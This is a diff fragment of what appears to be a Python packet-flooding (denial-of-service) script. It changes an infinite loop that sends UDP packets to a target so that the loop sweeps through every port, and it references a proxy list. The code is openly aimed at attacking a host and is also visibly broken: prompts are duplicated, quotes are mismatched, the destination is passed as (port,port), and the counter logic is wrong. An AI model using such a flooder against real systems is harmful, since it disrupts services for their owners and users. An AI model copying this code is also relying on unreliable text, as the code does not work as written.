@@ -342,10 +342,13 @@ in_file.close()
 port=input("Port ( 80 ) : ')#Port we direct to attack
 port=input("Port ( 53 ) : ')#Port we direct to attack
 
-while 1: #Infinitely loops sending packets to the port until the program is exited.
-    sock.sendto(bytes,(ip,port))
-    print "Sent %s amount of packets to %s at port %s." % (sent,ip,port,)
-    sent= sent + 1
+while True:
+     sock.sendto(bytes, (port,port))
+     port = port + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
 
 listaproxy = proxyf.split('\n')
 #So luong
